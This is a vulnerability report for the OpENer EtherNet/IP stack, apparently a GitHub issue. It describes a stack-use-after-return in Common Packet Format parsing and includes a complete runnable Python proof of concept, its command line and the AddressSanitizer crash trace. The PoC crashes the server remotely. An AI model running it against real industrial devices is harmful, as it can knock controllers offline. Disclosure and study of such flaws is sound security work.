@@ -1,0 +1,306 @@
+issue #575
+
+Summary
+A remotely reachable stack-use-after-return exists in the current OpENer master branch in the EtherNet/IP Common Packet Format (CPF) handling logic.
+
+The issue is caused by reusing the process-global CPF parsing state g_common_packet_format_data_item across different messages and protocol paths. CreateCommonPacketFormatStructure() only refreshes data_item when item_count >= 2. When a later CPF packet has item_count == 1, the function updates the address item but leaves the previous data_item.type_id, data_item.length, and data_item.data unchanged.
+
+As a result, a valid UDP I/O consuming packet can first populate g_common_packet_format_data_item.data_item.data with a pointer into the stack buffer of CheckAndHandleConsumingUdpSocket(). A later TCP SendUnitData packet with only a ConnectionAddress item (item_count = 1) can then reuse that stale UDP data_item in the TCP connected explicit path, causing NotifyConnectedCommonPacketFormat() to read from a returned UDP stack frame.
+
+This is reproducible against the unmodified POSIX OpENer server using a client-side PoC.
+
+Version
+OpENer v2.3 / master branch up to commit 76b95cf
+
+Impact
+A remote attacker who can reach the OpENer EtherNet/IP service can establish normal CIP connections and send a crafted sequence of TCP and UDP packets that causes the server to dereference a pointer into a returned UDP stack frame.
+
+In ASan builds, this is reported as:
+
+AddressSanitizer: stack-use-after-return
+At minimum, this is a remotely triggerable denial of service. In non-ASan builds, the stale stack pointer may cause process crash, protocol-state confusion, or consumption of stale stack bytes as connected explicit message data.
+
+PoC
+
+#!/usr/bin/env python3
+import os
+import socket
+import struct
+import sys
+
+
+HOST = os.environ.get("OPENER_HOST", "127.0.0.1")
+TCP_PORT = 44818
+UDP_IO_PORT = 2222
+
+IO_PATH = bytes([0x20, 0x04, 0x24, 0x97, 0x2C, 0x96, 0x2C, 0x64])
+MR_PATH = bytes([0x20, 0x02, 0x24, 0x01])
+NONCYCLIC_TRIGGER = 0x11
+GET_VENDOR_ID = bytes([0x0E, 0x03, 0x20, 0x01, 0x24, 0x01, 0x30, 0x01])
+
+
+def encap(command: int, session: int, payload: bytes, context: bytes) -> bytes:
+    return struct.pack("<HHII8sI", command, len(payload), session, 0, context, 0) + payload
+
+
+def register_session(sock: socket.socket) -> int:
+    sock.sendall(encap(0x0065, 0, struct.pack("<HH", 1, 0), b"REGSESSN"))
+    response = sock.recv(1024)
+    if len(response) < 24:
+        raise RuntimeError(f"short RegisterSession response: {response.hex()}")
+    return struct.unpack_from("<I", response, 4)[0]
+
+
+def recv_optional(sock: socket.socket, timeout: float = 1.0) -> bytes:
+    sock.settimeout(timeout)
+    try:
+        return sock.recv(4096)
+    except socket.timeout:
+        return b""
+
+
+def wrap_send_rr_data(session: int, cip: bytes, context: bytes) -> bytes:
+    cpf = struct.pack(
+        "<IHHHHHH",
+        0,
+        0,
+        2,
+        0x0000,
+        0x0000,
+        0x00B2,
+        len(cip),
+    ) + cip
+    return encap(0x006F, session, cpf, context)
+
+
+def wrap_send_unit_data(session: int, connection_id: int, seq: int, mr: bytes, context: bytes) -> bytes:
+    cpf = struct.pack(
+        "<IHHHHIHHH",
+        0,
+        0,
+        2,
+        0x00A1,
+        4,
+        connection_id,
+        0x00B1,
+        2 + len(mr),
+        seq,
+    ) + mr
+    return encap(0x0070, session, cpf, context)
+
+
+def wrap_send_unit_data_item_count1(session: int, connection_id: int, context: bytes) -> bytes:
+    cpf = struct.pack(
+        "<IHHHHI",
+        0,
+        0,
+        1,
+        0x00A1,
+        4,
+        connection_id,
+    )
+    return encap(0x0070, session, cpf, context)
+
+
+def build_io_forward_open(serial: int, originator_serial: int, consumed_id: int, produced_id: int) -> bytes:
+    cip = bytes([0x54, 0x02, 0x20, 0x06, 0x24, 0x01])
+    cip += struct.pack(
+        "<BBIIHHIB3xIHIHB",
+        0x0A,
+        0x0E,
+        consumed_id,
+        produced_id,
+        serial,
+        0x4321,
+        originator_serial,
+        0x01,
+        100000,
+        0x4026,  # O->T fixed size 38: 2(seq) + 4(run/idle) + 32(assembly)
+        100000,
+        0x4022,  # T->O fixed size 34
+        NONCYCLIC_TRIGGER,
+    )
+    cip += struct.pack("<B", len(IO_PATH) // 2)
+    cip += IO_PATH
+    return cip
+
+
+def build_class3_forward_open(serial: int, vendor: int, originator_serial: int,
+                              proposed_o2t: int, proposed_t2o: int) -> bytes:
+    cip = bytes([0x54, 0x02, 0x20, 0x06, 0x24, 0x01])
+    cip += struct.pack(
+        "<BBIIHHIB3xIHIHB",
+        0x0A,
+        0x0E,
+        proposed_o2t,
+        proposed_t2o,
+        serial,
+        vendor,
+        originator_serial,
+        0x01,
+        100000,
+        0x4000,
+        100000,
+        0x4000,
+        0x03,
+    )
+    cip += struct.pack("<B", len(MR_PATH) // 2)
+    cip += MR_PATH
+    return cip
+
+
+def parse_rr_mr_response(response: bytes) -> tuple[int, int, list[int], bytes]:
+    if len(response) < 40:
+        raise RuntimeError(f"short RRData response: {response.hex()}")
+    mr = response[40:]
+    if len(mr) < 4:
+        raise RuntimeError(f"short MR response: {response.hex()}")
+    reply_service, _reserved, general_status, add_count = mr[:4]
+    pos = 4
+    add_status = []
+    for _ in range(add_count):
+        add_status.append(struct.unpack_from("<H", mr, pos)[0])
+        pos += 2
+    return reply_service, general_status, add_status, mr[pos:]
+
+
+def parse_forward_open_success(response: bytes) -> tuple[int, int]:
+    reply_service, general_status, add_status, payload = parse_rr_mr_response(response)
+    if reply_service != 0xD4 or general_status != 0x00:
+        raise RuntimeError(
+            f"ForwardOpen failed: svc=0x{reply_service:02x} gs=0x{general_status:02x} "
+            f"add={add_status} payload={payload.hex()}"
+        )
+    if len(payload) < 26:
+        raise RuntimeError(f"short ForwardOpen payload: {payload.hex()}")
+    consumed = struct.unpack_from("<I", payload, 0)[0]
+    produced = struct.unpack_from("<I", payload, 4)[0]
+    return consumed, produced
+
+
+def open_connection(sock: socket.socket, session: int, cip: bytes, tag: bytes) -> tuple[int, int]:
+    sock.sendall(wrap_send_rr_data(session, cip, tag))
+    response = recv_optional(sock)
+    if not response:
+        raise RuntimeError("ForwardOpen timed out")
+    consumed, produced = parse_forward_open_success(response)
+    print(
+        f"forward_open tag={tag.decode(errors='ignore')} "
+        f"consumed=0x{consumed:08x} produced=0x{produced:08x}"
+    )
+    return consumed, produced
+
+
+def build_seed_mr(length: int) -> bytes:
+    base = bytes([0x0E, 0x03, 0x20, 0x01, 0x24, 0x01, 0x30, 0x01])
+    if length < len(base):
+        raise ValueError(length)
+    return base + b"S" * (length - len(base))
+
+
+def send_udp_connected_seed(host: str, io_connection_id: int, data: bytes, eip_seq: int = 1) -> None:
+    packet = struct.pack(
+        "<HHHIIHH",
+        2,
+        0x8002,
+        8,
+        io_connection_id,
+        eip_seq,
+        0x00B1,
+        len(data),
+    ) + data
+    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as udp:
+        udp.sendto(packet, (host, UDP_IO_PORT))
+    print(
+        f"udp_seed packet_len={len(packet)} io_connection_id=0x{io_connection_id:08x} "
+        f"eip_seq={eip_seq} data_len={len(data)}"
+    )
+
+
+def send_udp_stale_probe(host: str, io_connection_id: int, eip_seq: int = 1) -> None:
+    # item_count=1, sequenced address only; stale data_item.{type,length,data}
+    # come from the prior TCP connected explicit packet.
+    packet = struct.pack("<HHHII", 1, 0x8002, 8, io_connection_id, eip_seq)
+    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as udp:
+        udp.sendto(packet, (host, UDP_IO_PORT))
+    print(f"udp_probe packet_len={len(packet)} io_connection_id=0x{io_connection_id:08x} eip_seq={eip_seq}")
+
+
+def main() -> int:
+    mode = sys.argv[1] if len(sys.argv) > 1 else "tcp_to_udp"
+    host = sys.argv[2] if len(sys.argv) > 2 else HOST
+    seed_mr_len = int(sys.argv[3]) if len(sys.argv) > 3 else 36
+    if seed_mr_len < 8:
+        raise SystemExit("seed_mr_len must be >= 8")
+    if mode not in {"tcp_to_udp", "udp_to_tcp"}:
+        raise SystemExit(f"usage: {sys.argv[0]} [tcp_to_udp|udp_to_tcp] [host] [seed_mr_len]")
+
+    with socket.create_connection((host, TCP_PORT), timeout=3.0) as sock:
+        session = register_session(sock)
+        print(f"session={session}")
+
+        io_consumed, _io_produced = open_connection(
+            sock,
+            session,
+            build_io_forward_open(0x4001, 0x11112222, 0xABC00001, 0xABC00002),
+            b"IOFOOPEN",
+        )
+        class3_consumed, _class3_produced = open_connection(
+            sock,
+            session,
+            build_class3_forward_open(0x4002, 0x1337, 0x33334444, 0xABC10001, 0xABC10002),
+            b"C3FOOPEN",
+        )
+
+        if mode == "tcp_to_udp":
+            seed_mr = build_seed_mr(seed_mr_len)
+            print(
+                f"seed connected explicit connection_id=0x{class3_consumed:08x} "
+                f"connected_data_len={2 + len(seed_mr)} mr_len={len(seed_mr)}"
+            )
+            sock.sendall(
+                wrap_send_unit_data(session, class3_consumed, 0x5150, seed_mr, b"TCPSEED!")
+            )
+            seed_response = recv_optional(sock)
+            print(f"seed_response_len={len(seed_response)}")
+            send_udp_stale_probe(host, io_consumed)
+        else:
+            if seed_mr_len > 494:
+                raise SystemExit("udp_to_tcp seed_mr_len must be <= 494")
+            # Prime the class3 sequence counter so stale seq=0 does not fall
+            # into the duplicate-reply path.
+            sock.sendall(
+                wrap_send_unit_data(session, class3_consumed, 5, GET_VENDOR_ID, b"C3PRIME!")
+            )
+            prime_response = recv_optional(sock)
+            print(f"prime_response_len={len(prime_response)}")
+            udp_seed = build_seed_mr(seed_mr_len)
+            send_udp_connected_seed(host, io_consumed, udp_seed, eip_seq=7)
+            sock.sendall(
+                wrap_send_unit_data_item_count1(session, class3_consumed, b"TCPSTAL!")
+            )
+            response = recv_optional(sock)
+            print(f"stale_tcp_response_len={len(response)}")
+    return 0
+
+
+if __name__ == "__main__":
+    raise SystemExit(main())
+
+python3 poc.py udp_to_tcp 192.168.153.128 494
+
+
+Expected server crash
+The server crashes with ASan:
+
+=================================================================
+==108360==ERROR: AddressSanitizer: stack-use-after-return on address 0x75db24302c62 at pc 0x5b17bacd93c7 bp 0x7ffd7c227350 sp 0x7ffd7c227348
+READ of size 1 at 0x75db24302c62 thread T0
+    #0 0x5b17bacd93c6 in GetUintFromMessage /home/weichuan/wc/OpENer/source/src/enet_encap/endianconv.c:75:20
+    #1 0x5b17bacd1fa8 in NotifyConnectedCommonPacketFormat /home/weichuan/wc/OpENer/source/src/enet_encap/cpf.c:141:13
+    #2 0x5b17bacd6190 in HandleReceivedSendUnitDataCommand /home/weichuan/wc/OpENer/source/src/enet_encap/encap.c:526:22
+    #3 0x5b17bacd49ef in HandleReceivedExplictTcpData /home/weichuan/wc/OpENer/source/src/enet_encap/encap.c:191:26
+    #4 0x5b17bac95554 in HandleDataOnTcpSocket /home/weichuan/wc/OpENer/source/src/ports/generic_networkhandler.c:864:30
+    #5 0x5b17bac939c1 in NetworkHandlerProcessCyclic /home/weichuan/wc/OpENer/source/src/ports/generic_networkhandler.c:497:32
+    #6 0x5b17bac911a4 in executeEventLoop /home/weichuan/wc/OpENer/source/src/ports/POSIX/main.c:261:24
+    #7 0x5b17bac911a4 in main /home/weichuan/wc/OpENer/source/src/ports/POSIX/main.c:229:12
